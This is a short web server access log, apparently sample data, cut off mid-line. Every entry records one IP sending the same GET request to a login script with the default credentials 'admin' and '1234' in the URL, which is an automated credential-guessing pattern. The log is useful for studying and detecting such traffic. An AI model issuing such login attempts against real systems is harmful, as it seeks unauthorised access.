62.109.16.162 - - [18/May/2019:03:34:58 +0200] "GET /authorize.php/?username=admin&password=1234 HTTP/1.0" 200 7079 "/register.php/" "Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0 Iceweasel/41.0"
62.109.16.162 - - [18/May/2019:03:34:58 +0200] "GET /authorize.php/?username=admin&password=1234 HTTP/1.0" 200 34887 "/register.php/" "Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0 Iceweasel/41.0"
62.109.16.162 - - [18/May/2019:03:34:58 +0200] "GET /authorize.php/?username=admin&password=1234 HTTP/1.0" 200 23159 "/register.php/" "Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0 Iceweasel/41.0"
62.109.16.162 - - [18/May/2019:03:34:58 +0200] "GET /authorize.php/?username=admin&password=1234 HTTP/1.0" 200 42902 "/register.php/" "Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0 Iceweasel/41.0"
62.109.16.162 - - [18/May/2019:03:34:58 +0200] "GET /authorize.php/?username=admin&password=1234 HTTP/1.0" 200 61720 "/register.php/" "Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0 Iceweasel/41.0"
62.109.16.162 - - [18/May/2019:03:34:58 +0200] "GET /authorize.php/?username=admin&password=1234 HTTP/1.0" 200 41968 "/register.php/" "Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0 Iceweasel/41.0"
62.109.16.162 - - [18/May/2019:03:34:58 +0200] "GET /authorize.php/?username=admin&password=1234 HTTP/1.0" 200 44010 "/register.php/" "Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0 Iceweasel/41.0"
62.109.16.162 - - [18/May/2019:03:34:58 +0200] "GET /authorize.php/?username=admin&password=1234 HTTP/1.0" 200 2883 "/register.php/" "Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0 Iceweasel/41.0"
62.109.16.162 - - [18/May/2019:03:34:58 +0200] "GET /authorize.php/?username=admin&password=1234 HTTP/1.0" 200 27555 "/register